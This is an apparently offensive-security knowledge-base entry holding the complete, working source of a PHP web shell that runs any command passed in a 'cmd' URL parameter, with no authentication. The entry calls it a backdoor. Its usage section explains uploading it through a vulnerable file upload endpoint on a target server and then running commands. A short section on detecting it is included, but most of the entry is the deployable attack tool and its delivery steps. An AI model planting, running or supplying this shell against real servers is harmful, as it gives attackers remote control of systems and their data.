---
id: a8b8118c-3a0c-428f-b0a8-c026fbe6a265
type: code
language: PHP
verified: true
created_at: '2020-07-29T17:19:55.838442+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
  - Linux
  - Windows
tags:
  - web-shell
  - php
  - rce
  - payload
validated: true
---

# PHP-Basic-Command-Execution-Web-Shell

## Code

```php
<html>
<body>
<form method ="GET" name= <?php echo basename($_SERVER['PHP_SELF']); ?>
<input type="TEXT" name="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

## Description

This PHP code implements a basic web shell that provides a simple HTML form for entering system commands via GET parameters. When accessed via a browser, it displays an input field and executes the provided command using PHP's system() function, outputting the results in a pre-formatted block. The form name dynamically uses the current script's basename for self-submission. It auto-focuses the input for usability and requires no authentication, making it a lightweight backdoor for remote command execution on PHP-enabled servers.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_GET['cmd'] | Command string passed via URL query (e.g., ?cmd=whoami) | whoami, ls -la, id |

No other variables are used; the code is self-contained and relies on server-side PHP execution.

## Usage

Save this code as a .php file (e.g., shell.php) and upload it to a web-accessible directory via a vulnerable file upload endpoint. Access the file's URL (e.g., http://target.com/uploads/shell.php) in a browser to load the interface. Enter commands in the text field and submit to execute them on the server. Commonly used in web app exploitation after initial access, such as in conjunction with file upload vulnerabilities. Deliver via [[commands/curl-upload-webshell]] or manual upload.

## Detection

Defenders can detect this via web server logs showing repeated GET requests with 'cmd' parameters to unusual PHP files, anomalous system() calls in PHP execution logs (enable via error_log), or file integrity monitoring alerting to new .php files in upload directories. Signatures include the HTML form structure in uploaded files or network traffic with command outputs in HTTP responses. WAF rules can block requests containing 'cmd=' in queries to PHP endpoints.

## Related

- [[procedures/Web-Shell-Through-File-Upload]] (procedure that deploys this code)
- [[curl-upload-webshell]] (command for delivery)
